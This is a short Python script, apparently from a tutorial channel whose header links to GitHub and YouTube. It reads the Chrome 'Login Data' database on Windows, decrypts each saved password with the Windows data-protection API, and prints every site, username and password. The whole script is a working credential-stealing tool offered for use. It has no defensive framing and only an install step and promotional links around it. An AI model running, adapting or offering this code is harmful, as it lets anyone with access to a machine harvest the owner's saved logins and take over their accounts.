# NABEGHEHA.COM

# First        : pip install pypiwin32

# Github       : https://github.com/NABEGHEHACOM
# Youtube      : https://youtu.be/HtJvQDSc4Ts
# Social Media : https://nabegheha.com/socials


import os
import sqlite3
import win32crypt

data = os.path.expanduser(
    '~')+r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"

connection = sqlite3.connect(data)
cursor = connection.cursor()

cursor.execute('SELECT action_url, username_value, password_value FROM logins')
final_data = cursor.fetchall()
cursor.close()

for chrome_logins in final_data:
    password = win32crypt.CryptUnprotectData(
        chrome_logins[2], None, None, None, 0)[1]
    print("Website : "+str(chrome_logins[0]))
    print("Username : "+str(chrome_logins[1]))
    print("Password : "+str(password))
